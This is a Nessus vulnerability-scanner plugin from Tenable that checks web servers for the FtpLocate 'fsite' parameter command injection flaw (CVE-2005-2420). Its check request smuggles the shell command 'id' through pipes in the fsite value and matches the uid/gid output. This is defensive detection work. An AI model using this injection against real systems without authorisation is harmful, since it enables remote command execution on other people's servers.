#
# (C) Tenable Network Security
#

include("compat.inc");

if (description) {
  script_id(19300);
  script_version("$Revision: 1.9 $");

  script_cve_id("CVE-2005-2420");
  script_bugtraq_id(14367);
  script_xref(name:"OSVDB", value:"18305");

  script_name(english:"FtpLocate flsearch.pl fsite Parameter Remote File Inclusion");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a Perl script that is allows arbitrary
commands to be executed." );
 script_set_attribute(attribute:"description", value:
"The remote host is running FtpLocate, a web search engine for FTP
sites written in Perl. 

The installed version of FtpLocate allows remote attackers to execute
commands on the remote host by manipulating input to the 'fsite'
parameter in various scripts." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/406373/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
 script_end_attributes();

 
  summary["english"] = "Checks for fsite parameter command execution vulnerability in FtpLocate";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include('global_settings.inc');
include("misc_func.inc");
include("http.inc");

if (thorough_tests) 
  extra_list = make_list("/ftplocate", "/cgi-bin/ftplocate");
else 
  extra_list = NULL;

http_check_remote_code (
			extra_dirs: extra_list,
			check_request:"/flserv.pl?cmd=exec_flsearch&query=" + SCRIPT_NAME + "&fsite=|id|",
			extra_check:"cache hit",
			check_result:"uid=[0-9]+.*gid=[0-9]+.*",
			command:"id"
			);
